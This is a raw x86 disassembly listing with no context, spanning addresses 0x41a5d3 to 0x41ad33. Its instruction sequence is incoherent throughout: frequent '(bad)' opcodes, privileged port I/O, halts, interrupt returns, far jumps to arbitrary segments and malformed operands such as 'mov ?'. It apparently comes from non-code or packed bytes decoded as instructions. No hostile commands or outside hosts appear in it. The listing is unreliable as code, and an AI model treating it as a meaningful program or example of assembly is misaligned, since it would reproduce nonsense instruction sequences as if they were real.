  41a5d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5d4:	fisttp DWORD PTR [ebx-0x38b9c32b]
  41a5da:	ins    BYTE PTR es:[edi],dx
  41a5db:	push   edi
  41a5dc:	arpl   WORD PTR [ecx+0x43e33346],si
  41a5e2:	jl     0x41a5d2
  41a5e4:	mov    edi,0x23c29778
  41a5e9:	fsub   QWORD PTR [edx-0x66]
  41a5ec:	sbb    ecx,DWORD PTR [eax-0x1c]
  41a5ef:	mov    dh,0x86
  41a5f1:	sub    ebp,DWORD PTR [eax]
  41a5f3:	xor    DWORD PTR [ebx+0x49b992e0],esp
  41a5f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5fa:	push   edx
  41a5fb:	ror    BYTE PTR fs:[eax+eax*2-0x33],1
  41a600:	jae    0x41a5bf
  41a602:	inc    ebp
  41a603:	test   eax,0x9eb817a4
  41a608:	dec    edx
  41a609:	sar    DWORD PTR [ebx+0x79],0xec
  41a60d:	mov    ecx,DWORD PTR [eax]
  41a60f:	mov    ?,WORD PTR [edi+0x7777f2fb]
  41a615:	aaa    
  41a616:	mov    bl,0xda
  41a618:	cld    
  41a619:	push   edx
  41a61a:	out    0x93,eax
  41a61c:	gs push 0xe
  41a61f:	sbb    ah,BYTE PTR [ebx+0x18]
  41a622:	icebp  
  41a623:	or     BYTE PTR [ebp+edx*1+0x78a9eb6e],dl
  41a62a:	mov    ch,0x46
  41a62c:	add    al,0xd9
  41a62e:	out    dx,al
  41a62f:	faddp  st(3),st
  41a631:	jnp    0x41a63b
  41a633:	xchg   edx,eax
  41a634:	mov    ecx,0x759968f8
  41a639:	mov    esp,0xc3e0d74c
  41a63e:	iret   
  41a63f:	lods   eax,DWORD PTR ds:[esi]
  41a640:	xor    ah,bl
  41a642:	loopne 0x41a664
  41a644:	jp     0x41a695
  41a646:	pop    ebx
  41a647:	mov    DWORD PTR [eax],ebp
  41a649:	hlt    
  41a64a:	xor    edi,ebx
  41a64c:	dec    BYTE PTR [eax+0x6f]
  41a64f:	les    ebx,FWORD PTR [ebx-0x58]
  41a652:	outs   dx,DWORD PTR ds:[esi]
  41a653:	or     dl,dh
  41a655:	sbb    BYTE PTR [ecx-0x306ef1c2],ah
  41a65b:	shr    BYTE PTR [ebx+esi*8+0x4cd0a1d9],cl
  41a662:	rcl    BYTE PTR [ebp-0x4768e75c],0x92
  41a669:	ret    
  41a66a:	or     al,BYTE PTR [ebx+0x29a04639]
  41a670:	scas   eax,DWORD PTR es:[edi]
  41a671:	(bad)  
  41a672:	hlt    
  41a673:	leave  
  41a674:	and    esi,DWORD PTR [ebx+ebp*8+0x56]
  41a678:	xchg   esp,ebx
  41a67a:	iret   
  41a67b:	aas    
  41a67c:	jge    0x41a61d
  41a67e:	test   al,0x6
  41a680:	mov    esp,0x1401aa2
  41a685:	mov    al,ds:0xf0fd7c84
  41a68a:	in     al,0x33
  41a68c:	shl    DWORD PTR [edi],0xae
  41a68f:	test   eax,0x7a9808f7
  41a694:	add    BYTE PTR [ebx],dl
  41a696:	aaa    
  41a697:	outs   dx,DWORD PTR es:[esi]
  41a699:	lea    esi,[esi+0x2b7f9eae]
  41a69f:	xchg   edx,eax
  41a6a0:	pusha  
  41a6a1:	cdq    
  41a6a2:	mov    ch,0xf3
  41a6a4:	(bad)  
  41a6a5:	les    ecx,FWORD PTR [edx+0x2]
  41a6a8:	(bad)  
  41a6a9:	gs push 0xffffff93
  41a6ac:	lods   al,BYTE PTR ds:[esi]
  41a6ad:	xchg   esi,eax
  41a6ae:	addr16 dec ebp
  41a6b0:	mov    eax,ds:0x4994500
  41a6b5:	loope  0x41a6ea
  41a6b7:	jmp    0x1af8:0xdd5ccb85
  41a6be:	pop    eax
  41a6bf:	cmp    ebp,DWORD PTR [ebx+0x6d]
  41a6c2:	or     eax,0x501563c5
  41a6c7:	loop   0x41a6ff
  41a6c9:	ja     0x41a68f
  41a6cb:	jae    0x41a6cf
  41a6cd:	adc    eax,0x21d1244a
  41a6d2:	outs   dx,BYTE PTR ds:[esi]
  41a6d3:	jb     0x41a65a
  41a6d5:	sahf   
  41a6d6:	pop    ebp
  41a6d7:	pop    es
  41a6d8:	cmp    DWORD PTR [edx],esp
  41a6da:	pop    ebp
  41a6db:	inc    edx
  41a6dc:	sub    edx,edx
  41a6de:	cmp    eax,0xfeb3114a
  41a6e3:	popa   
  41a6e4:	adc    ebp,DWORD PTR [edx]
  41a6e6:	es je  0x41a691
  41a6e9:	pusha  
  41a6ea:	lahf   
  41a6eb:	leave  
  41a6ec:	push   es
  41a6ed:	inc    esp
  41a6ee:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6f0:	add    al,0xe7
  41a6f2:	lods   eax,DWORD PTR ds:[esi]
  41a6f3:	xlat   BYTE PTR ds:[ebx]
  41a6f4:	loop   0x41a67a
  41a6f6:	retf   0x86dc
  41a6f9:	popf   
  41a6fa:	rcr    BYTE PTR [edx],cl
  41a6fc:	and    DWORD PTR [esi-0x6a],eax
  41a6ff:	adc    edi,DWORD PTR [ebp+0x19]
  41a702:	(bad)  [ebx-0x1f60f456]
  41a708:	lods   eax,DWORD PTR ds:[esi]
  41a709:	les    ebp,FWORD PTR [edx-0x4f]
  41a70c:	push   edx
  41a70d:	dec    esi
  41a70e:	test   eax,0x1c43ef90
  41a713:	out    dx,eax
  41a714:	stc    
  41a715:	repz pushf 
  41a717:	fsub   DWORD PTR [edi+0x62]
  41a71a:	mov    ah,0x60
  41a71c:	imul   DWORD PTR [ebx+0x76]
  41a71f:	pop    ds
  41a720:	pop    esp
  41a721:	cmp    ebx,eax
  41a723:	mov    BYTE PTR [ebx],ah
  41a725:	rcr    esi,1
  41a727:	sbb    eax,0x671b4e9c
  41a72c:	xchg   esp,eax
  41a72d:	jle    0x41a6d4
  41a72f:	inc    ecx
  41a730:	mov    DWORD PTR [esi],edi
  41a732:	adc    ebx,DWORD PTR [ebp-0x7c]
  41a735:	add    eax,DWORD PTR [eax+0x40c7f561]
  41a73b:	shl    BYTE PTR [ebp+0x7284a9e4],cl
  41a741:	inc    edi
  41a742:	mov    bh,0xbe
  41a744:	cmc    
  41a745:	out    0x72,al
  41a747:	lea    ebp,[eax-0x75]
  41a74a:	xchg   esp,eax
  41a74b:	mov    esp,0x84d66450
  41a750:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a752:	mov    BYTE PTR [ebx+ebx*8-0x62],ah
  41a756:	pop    edi
  41a757:	pushf  
  41a758:	popa   
  41a759:	pop    edi
  41a75a:	cmp    al,0x4c
  41a75c:	pop    ebx
  41a75d:	sub    al,0xe9
  41a75f:	mov    ds:0xdbcd93a9,al
  41a764:	dec    esp
  41a765:	dec    edx
  41a766:	rcl    eax,0xa
  41a769:	or     dl,BYTE PTR [ebp+0x32a21397]
  41a76f:	cld    
  41a770:	jne    0x41a6fa
  41a772:	and    ebp,ecx
  41a774:	pop    edx
  41a775:	add    eax,0xdc7dc60d
  41a77a:	mov    ah,0x74
  41a77c:	xor    eax,0x2bbf3c1f
  41a781:	popf   
  41a782:	pop    edi
  41a783:	test   BYTE PTR [edx],bl
  41a785:	add    eax,0x51f0d1af
  41a78a:	retf   0x28e
  41a78d:	jp     0x41a783
  41a78f:	adc    ch,BYTE PTR [esi+eiz*8+0x7b36de8]
  41a796:	sub    eax,0xf47af104
  41a79b:	(bad)  
  41a79c:	loope  0x41a77d
  41a79e:	mov    ds:0x74bb2bc1,eax
  41a7a3:	pusha  
  41a7a4:	cmp    al,0xd2
  41a7a6:	inc    edi
  41a7a7:	(bad)  
  41a7a8:	jbe    0x41a7b9
  41a7aa:	mov    ds:0x52e9f5c7,eax
  41a7af:	jne    0x41a7ba
  41a7b1:	fcomp  QWORD PTR [esi+0x47e89086]
  41a7b7:	mov    bh,0xb1
  41a7b9:	xor    DWORD PTR [eax],edx
  41a7bb:	and    al,0x82
  41a7bd:	and    ch,BYTE PTR [ebp+ebx*8-0x517cb77c]
  41a7c4:	xor    BYTE PTR [ecx],ch
  41a7c6:	mov    ds:0x2c230271,eax
  41a7cb:	stos   BYTE PTR es:[edi],al
  41a7cc:	adc    edi,DWORD PTR [ecx-0x3218d854]
  41a7d2:	mov    WORD PTR [edx-0x66b513af],cs
  41a7d8:	add    ah,BYTE PTR [esi-0x4a]
  41a7db:	retf   0x352d
  41a7de:	mov    ds:0xd55de593,eax
  41a7e3:	mov    al,ds:0xb1cfce01
  41a7e8:	jp     0x41a7ae
  41a7ea:	push   edi
  41a7eb:	fiadd  DWORD PTR [ebx+0x4d]
  41a7ee:	xor    bx,cx
  41a7f1:	stos   BYTE PTR es:[edi],al
  41a7f2:	adc    BYTE PTR [edx+0x65],ah
  41a7f5:	or     cl,BYTE PTR [edi+ebp*8-0x14]
  41a7f9:	cli    
  41a7fa:	or     dl,bl
  41a7fc:	lea    ebx,[edx+esi*2+0x21]
  41a800:	stos   BYTE PTR es:[edi],al
  41a801:	mov    ebx,0xb6553007
  41a806:	fmul   QWORD PTR [esi+0x29]
  41a809:	jno    0x41a835
  41a80b:	sub    ah,dl
  41a80d:	(bad)
  41a812:	adc    al,0xc1
  41a814:	pop    ebp
  41a815:	xor    BYTE PTR [ecx-0x52],al
  41a818:	into   
  41a819:	mov    cl,0x36
  41a81b:	jnp    0x41a7a0
  41a81d:	lea    ecx,[ebp+edx*4-0x4f]
  41a821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a822:	adc    ah,0x25
  41a825:	icebp  
  41a826:	pop    ds
  41a827:	sbb    ebx,DWORD PTR [edx-0x2b]
  41a82a:	sbb    eax,0x1e6e934e
  41a82f:	xor    DWORD PTR [ebx+0x30aa6487],esi
  41a835:	test   DWORD PTR [edx+0x65],esp
  41a838:	iret   
  41a839:	and    edx,DWORD PTR ds:[ecx+0xdce662]
  41a840:	sbb    al,dh
  41a842:	or     DWORD PTR [edx],ecx
  41a844:	xchg   BYTE PTR [ecx+ebx*2],cl
  41a847:	test   esi,0x9deeb8f7
  41a84d:	sub    eax,0x212234cb
  41a852:	mov    fs,WORD PTR [edi+0x3]
  41a855:	fdiv   QWORD PTR [edx+0x45]
  41a858:	xchg   BYTE PTR [edx],bl
  41a85a:	es aam 0x69
  41a85d:	popw   ss
  41a85f:	test   eax,0x59f34258
  41a864:	imul   edx,DWORD PTR [ecx+ecx*2+0x3e],0xd3124493
  41a86c:	sub    eax,0xe4ef6654
  41a871:	pop    esp
  41a872:	(bad)  
  41a873:	frstor [eax+0x5f7cda45]
  41a879:	cli    
  41a87a:	mov    DWORD PTR [ebp-0x7849c3b9],esi
  41a880:	daa    
  41a881:	mov    edx,0xbdec73b1
  41a886:	mov    bl,0xd5
  41a888:	cwde   
  41a889:	cmp    esi,ecx
  41a88b:	int    0x20
  41a88d:	pop    ecx
  41a88e:	xchg   edx,eax
  41a88f:	cmp    eax,DWORD PTR [esp+eax*8+0x6a7f9020]
  41a896:	mov    ah,0xda
  41a898:	sub    DWORD PTR [edi-0x6e014a18],esp
  41a89e:	mov    ebp,0x6f0fe117
  41a8a3:	loopne 0x41a87f
  41a8a5:	xor    BYTE PTR [esi+0x779a9555],cl
  41a8ab:	jl     0x41a8c8
  41a8ad:	or     DWORD PTR [ebp+0x27],ecx
  41a8b0:	mov    ecx,0xfe0161ea
  41a8b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8b6:	jg     0x41a8b7
  41a8b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8b9:	jns    0x41a8a0
  41a8bb:	icebp  
  41a8bc:	xlat   BYTE PTR ds:[ebx]
  41a8bd:	mov    esp,0xba78b285
  41a8c2:	popa   
  41a8c3:	fdiv   QWORD PTR [eax+0x3bca73]
  41a8c9:	xor    BYTE PTR [eax-0x44ae3ad6],al
  41a8cf:	mov    ah,0x7
  41a8d1:	inc    eax
  41a8d2:	push   ss
  41a8d3:	mov    esp,DWORD PTR [ebp-0x61]
  41a8d6:	int    0xa0
  41a8d8:	or     eax,DWORD PTR [ecx+0x48eb4b3]
  41a8de:	add    eax,0xc290d985
  41a8e3:	mov    WORD PTR [edx-0x20],gs
  41a8e6:	sbb    DWORD PTR [ecx],esp
  41a8e8:	std    
  41a8e9:	xchg   edx,eax
  41a8ea:	cli    
  41a8eb:	pop    eax
  41a8ec:	lea    esp,[edi+0x4ddc9629]
  41a8f2:	xchg   ebp,eax
  41a8f3:	and    al,0x96
  41a8f5:	ret    
  41a8f6:	cwde   
  41a8f7:	push   eax
  41a8f8:	mov    eax,ds:0x115d4b59
  41a8fd:	cdq    
  41a8fe:	or     DWORD PTR [ecx],eax
  41a900:	(bad)  
  41a901:	repz scas eax,DWORD PTR es:[edi]
  41a903:	popf   
  41a904:	push   edi
  41a905:	cs mov bh,0xc3
  41a908:	jmp    DWORD PTR [edi+0x8]
  41a90b:	push   edi
  41a90c:	sbb    eax,0x2398e733
  41a911:	dec    edi
  41a912:	shl    BYTE PTR [esi],1
  41a914:	sub    al,0xe1
  41a916:	popf   
  41a917:	mov    dl,0xe5
  41a919:	(bad)  
  41a91a:	nop
  41a91b:	cmp    eax,0x4e98f2b
  41a920:	les    ecx,FWORD PTR [ecx+0x1008e2e4]
  41a926:	lods   al,BYTE PTR ds:[esi]
  41a927:	rcr    edx,1
  41a929:	imul   ecx,DWORD PTR [ebp+0x6ec4bdd7],0x897dfdfb
  41a933:	xchg   BYTE PTR [edx+0x77],ch
  41a936:	in     al,dx
  41a937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a938:	dec    eax
  41a939:	fadd   DWORD PTR [eax+0x52]
  41a93c:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a93e:	ror    BYTE PTR [edx-0x80],0x8c
  41a942:	inc    esi
  41a943:	enter  0x357f,0x55
  41a947:	fwait
  41a948:	jae    0x41a8d9
  41a94a:	mov    ah,BYTE PTR [esi-0x58880a28]
  41a950:	rol    BYTE PTR [edx],1
  41a952:	push   eax
  41a953:	push   eax
  41a954:	pop    esi
  41a955:	stos   BYTE PTR es:[edi],al
  41a956:	scas   al,BYTE PTR es:[edi]
  41a957:	add    al,0x46
  41a959:	repnz lea edx,ds:[eax]
  41a95d:	daa    
  41a95e:	mov    ah,0x9a
  41a960:	sbb    eax,0xaa9ae75f
  41a965:	fwait
  41a966:	pop    es
  41a967:	fisubr DWORD PTR [ebx+0x72c3a807]
  41a96d:	out    dx,al
  41a96e:	jecxz  0x41a9a4
  41a970:	xlat   BYTE PTR ds:[ebx]
  41a971:	inc    esi
  41a972:	dec    ebx
  41a973:	push   cs
  41a974:	bound  eax,QWORD PTR [ebx+0x33]
  41a977:	xchg   ebx,eax
  41a978:	inc    ebx
  41a979:	xchg   esi,eax
  41a97a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a97b:	dec    eax
  41a97c:	aad    0xb2
  41a97e:	repnz stos BYTE PTR es:[edi],al
  41a980:	xchg   esi,eax
  41a981:	pop    edi
  41a982:	adc    ecx,eax
  41a984:	xchg   BYTE PTR [edx-0x78],dl
  41a987:	popf   
  41a988:	enter  0x8ae1,0xdb
  41a98c:	mov    ebp,0x66c56a06
  41a991:	fs (bad) 
  41a994:	push   ds
  41a995:	jl     0x41a93c
  41a997:	ds sti 
  41a999:	adc    BYTE PTR [esi-0x2853afb3],ch
  41a99f:	sahf   
  41a9a0:	xchg   esi,eax
  41a9a1:	sub    al,0x83
  41a9a3:	jge    0x41a93d
  41a9a5:	outs   dx,DWORD PTR ds:[esi]
  41a9a6:	push   esi
  41a9a7:	nop
  41a9a8:	std    
  41a9a9:	jnp    0x41aa08
  41a9ab:	xor    eax,0x343e0dfc
  41a9b0:	retf   
  41a9b1:	dec    edx
  41a9b2:	das    
  41a9b3:	fidivr WORD PTR [edi+ebx*2]
  41a9b6:	lods   eax,DWORD PTR ds:[esi]
  41a9b7:	push   edx
  41a9b8:	call   0x204e9702
  41a9bd:	pop    esp
  41a9be:	inc    edi
  41a9bf:	js     0x41aa23
  41a9c1:	and    edx,esp
  41a9c3:	gs sub ebx,ecx
  41a9c6:	mov    ch,BYTE PTR [ecx-0x3888fc45]
  41a9cc:	xchg   ebx,eax
  41a9cd:	out    dx,eax
  41a9ce:	add    esp,esi
  41a9d0:	push   0xc68e58e1
  41a9d5:	or     eax,esi
  41a9d7:	pop    esi
  41a9d8:	stos   DWORD PTR es:[edi],eax
  41a9d9:	pop    ds
  41a9da:	out    0x15,eax
  41a9dc:	or     eax,0xb2c625ff
  41a9e1:	inc    ebp
  41a9e2:	inc    esp
  41a9e3:	mov    ebp,0x64e5df4
  41a9e8:	and    bl,ah
  41a9ea:	repnz mov ebx,ecx
  41a9ed:	add    ah,BYTE PTR [esi]
  41a9ef:	xor    al,0x45
  41a9f1:	jae    0x41a99c
  41a9f3:	ja     0x41a9e5
  41a9f5:	jecxz  0x41aa5d
  41a9f7:	test   eax,0xe12aa1dc
  41a9fc:	mov    bh,0xa2
  41a9fe:	dec    edx
  41a9ff:	push   ebp
  41aa00:	repz cwde 
  41aa02:	mov    esi,0x9aaaf78f
  41aa07:	rcl    BYTE PTR [edx+0x7359c933],0xb4
  41aa0e:	xor    ecx,DWORD PTR [edi-0x21]
  41aa11:	leave  
  41aa12:	rcl    DWORD PTR [ecx+ebx*2-0x6cb83316],1
  41aa19:	cmc    
  41aa1a:	jp     0x41aa64
  41aa1c:	pop    ss
  41aa1d:	ret    0x40f8
  41aa20:	test   DWORD PTR [ebx],edx
  41aa22:	add    al,0x58
  41aa24:	jns    0x41aa54
  41aa26:	repz pushf 
  41aa28:	popa   
  41aa29:	outs   dx,DWORD PTR ds:[esi]
  41aa2a:	rol    al,1
  41aa2c:	jg     0x41aa10
  41aa2e:	mov    al,0xc5
  41aa30:	push   ds
  41aa31:	add    eax,0x4a09d0f
  41aa36:	sub    DWORD PTR ds:0x6cefaaa5,edx
  41aa3c:	inc    ecx
  41aa3d:	cwde   
  41aa3e:	mov    ebp,0xc9e4c5f7
  41aa43:	imul   edi,DWORD PTR ds:0xb0ffa00,0x22
  41aa4a:	xor    DWORD PTR [edx+0x48],edi
  41aa4d:	inc    edx
  41aa4e:	adc    ebp,esi
  41aa50:	inc    edi
  41aa51:	mov    esi,0xdcc8d59f
  41aa56:	sbb    al,0xe0
  41aa58:	out    dx,al
  41aa59:	in     al,0x34
  41aa5b:	jmp    FWORD PTR [ebp+0x591be756]
  41aa61:	or     ebx,ebp
  41aa63:	cli    
  41aa64:	imul   esp,DWORD PTR [esi-0x22f482b4],0x33f50d92
  41aa6e:	je     0x41aac8
  41aa70:	mov    DWORD PTR [edi+0x6c58c5ec],0xf45d3d6c
  41aa7a:	xchg   eax,esi
  41aa7c:	sti    
  41aa7d:	xor    al,0xa7
  41aa7f:	enter  0xed94,0x98
  41aa83:	sar    al,cl
  41aa85:	(bad)  
  41aa86:	jge    0x41aaed
  41aa88:	mov    ecx,esi
  41aa8a:	add    al,0xa0
  41aa8c:	test   DWORD PTR [esi-0x708c26ba],ecx
  41aa92:	sub    ebx,ebx
  41aa94:	jns    0x41aad8
  41aa96:	or     DWORD PTR [edi+esi*2],esi
  41aa99:	push   ds
  41aa9a:	jmp    0x5f7:0x5b696c08
  41aaa1:	push   ebp
  41aaa2:	enter  0xaa45,0x79
  41aaa6:	add    al,0xc
  41aaa8:	xchg   ecx,eax
  41aaa9:	jle    0x41aaa0
  41aaab:	stos   DWORD PTR es:[edi],eax
  41aaac:	lods   al,BYTE PTR ds:[esi]
  41aaad:	mov    ebp,0x230c6ecd
  41aab2:	pop    edi
  41aab3:	adc    sp,di
  41aab6:	(bad)  
  41aab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aab8:	ja     0x41aa47
  41aaba:	out    dx,al
  41aabb:	ret    0xe768
  41aabe:	add    eax,0xd1e4a757
  41aac3:	and    edx,DWORD PTR [ebp-0x8]
  41aac6:	jbe    0x41aab4
  41aac8:	mov    DWORD PTR [ebx+0x30],esp
  41aacb:	push   0x71cb0769
  41aad0:	mov    ebp,0x814e6471
  41aad5:	jbe    0x41aae7
  41aad7:	mov    DWORD PTR [esi],edx
  41aad9:	or     ah,BYTE PTR [ebx-0x72]
  41aadc:	mov    eax,0xfc0c75e6
  41aae1:	push   edx
  41aae2:	dec    ebx
  41aae3:	ja     0x41aa73
  41aae5:	inc    ecx
  41aae6:	or     eax,0x388c5a98
  41aaeb:	and    DWORD PTR [ecx],edi
  41aaed:	pop    esp
  41aaee:	push   0x354ac91f
  41aaf3:	bound  ecx,QWORD PTR [ecx]
  41aaf5:	sbb    al,0x42
  41aaf7:	and    BYTE PTR [edx+ebp*2-0x751f8366],dh
  41aafe:	add    DWORD PTR [ebx+ebp*4],esi
  41ab01:	cldemote BYTE PTR [esi-0x5ef7ca06]
  41ab08:	bndldx bnd0,[edx-0x4204cf60]
  41ab0f:	aam    0xf8
  41ab11:	dec    ebx
  41ab12:	or     BYTE PTR [esi+0x406c056f],cl
  41ab18:	mov    al,0xac
  41ab1a:	test   eax,0xb044603e
  41ab1f:	(bad)  [eax+0x2a6de3ef]
  41ab25:	clc    
  41ab26:	in     al,dx
  41ab27:	pusha  
  41ab28:	iret   
  41ab29:	add    dl,bl
  41ab2b:	cdq    
  41ab2c:	or     eax,0xcb9836fb
  41ab31:	mov    edx,0xb135a060
  41ab36:	cmp    DWORD PTR [ebx],0x38
  41ab39:	pop    esi
  41ab3a:	pop    eax
  41ab3b:	fcmovnu st,st(3)
  41ab3d:	push   es
  41ab3e:	add    bh,BYTE PTR [edx+eax*8-0x38]
  41ab42:	and    al,0x8f
  41ab44:	xchg   ecx,eax
  41ab45:	push   eax
  41ab46:	arpl   WORD PTR [ecx-0x22],sp
  41ab49:	mul    ebx
  41ab4b:	pop    es
  41ab4c:	mul    DWORD PTR [ebx]
  41ab4e:	push   0xef59a704
  41ab53:	or     dl,BYTE PTR [ecx]
  41ab55:	mov    ch,0x10
  41ab57:	inc    ebp
  41ab58:	jnp    0x41ab8d
  41ab5a:	and    eax,0x54184e53
  41ab5f:	mov    eax,0xc7a5b7ca
  41ab64:	add    ah,ch
  41ab66:	mov    edx,0x21d1e2aa
  41ab6b:	aas    
  41ab6c:	imul   ebx,ebx,0xffffff95
  41ab6f:	mov    WORD PTR [eax],es
  41ab71:	das    
  41ab72:	adc    bl,ch
  41ab74:	mov    bl,0xd5
  41ab76:	push   ecx
  41ab77:	push   edi
  41ab78:	xor    eax,0xd2a33174
  41ab7d:	xor    dl,ah
  41ab7f:	gs or  eax,0xb76f6184
  41ab85:	sbb    DWORD PTR [ebx],esp
  41ab87:	xchg   esi,eax
  41ab88:	imul   edi,DWORD PTR [ecx+0x65],0xdc82464e
  41ab8f:	or     DWORD PTR [edx-0x29],ebx
  41ab92:	and    ch,BYTE PTR [ebp-0x43]
  41ab95:	pop    ss
  41ab96:	mov    DWORD PTR [edx+0x5d],edx
  41ab99:	xor    DWORD PTR [edx+0x4559e3b7],edi
  41ab9f:	in     al,0xd8
  41aba1:	hlt    
  41aba2:	jns    0x41ab5f
  41aba4:	xor    eax,0x485f65d1
  41aba9:	arpl   dx,dx
  41abab:	imul   ebp,DWORD PTR [ecx-0x156bf10a],0x41c637ce
  41abb5:	outs   dx,BYTE PTR ds:[esi]
  41abb6:	shl    BYTE PTR [edi+0x3a77022d],0x48
  41abbd:	out    dx,eax
  41abbe:	sub    BYTE PTR [ebp+0x7395d177],bh
  41abc4:	jge    0x41ac14
  41abc6:	dec    edx
  41abc7:	nop
  41abc8:	(bad)  
  41abc9:	mov    dl,BYTE PTR [edx]
  41abcb:	popa   
  41abcc:	jb     0x41ab7d
  41abce:	inc    eax
  41abcf:	mov    edx,0xbc83ef4e
  41abd4:	sbb    BYTE PTR [esi],bh
  41abd6:	pop    ds
  41abd7:	iret   
  41abd8:	or     ecx,DWORD PTR [ecx-0x4d]
  41abdb:	or     eax,0x923b4f26
  41abe0:	mov    al,ds:0x918190e0
  41abe5:	mov    DWORD PTR [eax+0x1e],esi
  41abe8:	jmp    0x41abaf
  41abea:	fmul   DWORD PTR [ecx-0x79bd5059]
  41abf0:	push   esp
  41abf1:	fsubr  st,st(1)
  41abf3:	or     bl,BYTE PTR [ebx+eiz*8-0x37]
  41abf7:	loop   0x41abd2
  41abf9:	rcr    DWORD PTR cs:[ecx-0x74],1
  41abfd:	outs   dx,BYTE PTR ds:[esi]
  41abfe:	iret   
  41abff:	add    DWORD PTR [edi+0x7],0xa9d87476
  41ac06:	dec    ah
  41ac08:	lods   al,BYTE PTR ds:[esi]
  41ac09:	cwde   
  41ac0a:	xor    BYTE PTR [ecx],al
  41ac0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac0d:	or     ecx,DWORD PTR [bp+si+0x71f8]
  41ac12:	or     al,0xf1
  41ac14:	ss std 
  41ac16:	mov    esi,0x71ffec32
  41ac1b:	xor    eax,DWORD PTR [eax-0x42]
  41ac1e:	mov    dl,0xd5
  41ac20:	xor    al,0xce
  41ac22:	mov    WORD PTR [ebx-0x1331781e],fs
  41ac28:	in     eax,dx
  41ac29:	(bad)  
  41ac2b:	mov    bh,0x3
  41ac2d:	ret    
  41ac2e:	add    BYTE PTR [edi+eax*2+0x4a9c697b],ch
  41ac35:	retf   
  41ac36:	clc    
  41ac37:	idiv   DWORD PTR [edx]
  41ac39:	pop    ecx
  41ac3a:	fnstcw WORD PTR [ecx+0x4b]
  41ac3d:	cmc    
  41ac3e:	dec    ebp
  41ac3f:	mov    WORD PTR [esi-0x3],fs
  41ac42:	xchg   ebx,eax
  41ac43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac44:	bound  eax,QWORD PTR [ecx+ecx*4+0x13fa5ff]
  41ac4b:	xor    BYTE PTR [edi+edx*4],0xc0
  41ac4f:	sbb    DWORD PTR [edx-0x4e],ebx
  41ac52:	sub    eax,0x9a99cc82
  41ac57:	shr    DWORD PTR [eax],cl
  41ac59:	fld    QWORD PTR [eax+0xc52b757]
  41ac5f:	add    esi,ebp
  41ac61:	leave  
  41ac62:	outs   dx,BYTE PTR ds:[esi]
  41ac63:	outs   dx,BYTE PTR ds:[esi]
  41ac64:	mov    eax,0xbd991dd9
  41ac69:	dec    edi
  41ac6a:	imul   edi,DWORD PTR [ebp-0x7d],0x76
  41ac6e:	lods   al,BYTE PTR ds:[esi]
  41ac6f:	push   ds
  41ac70:	or     DWORD PTR [ecx+0x6b],edx
  41ac73:	push   0xdcfd7c27
  41ac78:	and    BYTE PTR [edx-0x2f],ah
  41ac7b:	mul    BYTE PTR [ebx+0x61]
  41ac7e:	xor    ah,0x72
  41ac81:	add    esi,edi
  41ac83:	xchg   esp,eax
  41ac84:	dec    esi
  41ac85:	test   eax,esp
  41ac87:	mov    bh,0x74
  41ac89:	ja     0x41acdc
  41ac8b:	adc    al,0xbd
  41ac8d:	sbb    dh,BYTE PTR [ebp-0x3a11bdd5]
  41ac93:	enter  0xce1,0xc3
  41ac97:	jbe    0x41ac4e
  41ac99:	lods   eax,DWORD PTR ds:[esi]
  41ac9a:	sbb    BYTE PTR [eax-0xba2288],0x19
  41aca1:	fstp   st(2)
  41aca3:	xlat   BYTE PTR ds:[ebx]
  41aca4:	sbb    DWORD PTR [eax],esi
  41aca6:	cli    
  41aca7:	push   ebp
  41aca8:	in     eax,0x36
  41acaa:	cmp    al,0x87
  41acac:	rcl    BYTE PTR [edx],0x90
  41acaf:	inc    ecx
  41acb0:	dec    ecx
  41acb1:	inc    esi
  41acb2:	ret    
  41acb3:	lods   eax,DWORD PTR ds:[esi]
  41acb4:	mov    edi,DWORD PTR [ebx]
  41acb6:	add    edx,DWORD PTR [eax]
  41acb8:	popf   
  41acb9:	pop    ss
  41acba:	mov    al,ds:0xa055e88
  41acbf:	data16 or cl,al
  41acc2:	jnp    0x41ad3f
  41acc4:	cmc    
  41acc5:	sub    al,BYTE PTR [edx+0x3cc0943f]
  41accb:	test   DWORD PTR [ecx+ecx*1],esi
  41acce:	mov    bl,0x78
  41acd0:	sbb    edi,DWORD PTR [eax]
  41acd2:	mov    bh,0x1a
  41acd4:	xchg   esi,eax
  41acd5:	ss push ebp
  41acd7:	stos   BYTE PTR es:[edi],al
  41acd8:	mov    ?,WORD PTR [eax-0x55]
  41acdb:	lods   eax,DWORD PTR ds:[esi]
  41acdc:	aas    
  41acdd:	inc    ebx
  41acde:	xor    bh,cl
  41ace0:	les    esp,FWORD PTR [eax+0x5b8a2f1]
  41ace6:	adc    eax,0x61f03055
  41aceb:	mov    eax,0x26cfd527
  41acf0:	enter  0x3af3,0xb3
  41acf4:	fsubr  QWORD PTR [esi-0xee318ca]
  41acfa:	push   ss
  41acfb:	out    0xc0,al
  41acfd:	mov    edi,ecx
  41acff:	jmp    0x38e80d02
  41ad04:	int    0x91
  41ad06:	xor    eax,DWORD PTR ds:0x23eef529
  41ad0c:	sbb    DWORD PTR [edi-0x52],edi
  41ad0f:	in     al,0xab
  41ad11:	(bad)  
  41ad12:	paddb  mm5,QWORD PTR [ebx+ebx*2]
  41ad16:	pop    ss
  41ad17:	mov    edx,0xe5c1d5c1
  41ad1c:	test   BYTE PTR [ebx+0x22],bl
  41ad1f:	out    0xc6,al
  41ad21:	dec    eax
  41ad22:	xchg   ebx,eax
  41ad23:	dec    eax
  41ad24:	pop    ecx
  41ad25:	call   0x38ce0518
  41ad2a:	cld    
  41ad2b:	popf   
  41ad2c:	and    ebx,esi
  41ad2e:	loopne 0x41ad77
  41ad30:	jnp    0x41ad59
  41ad32:	inc    edx
  41ad33:	shl    DWORD PTR [ebx],0x94
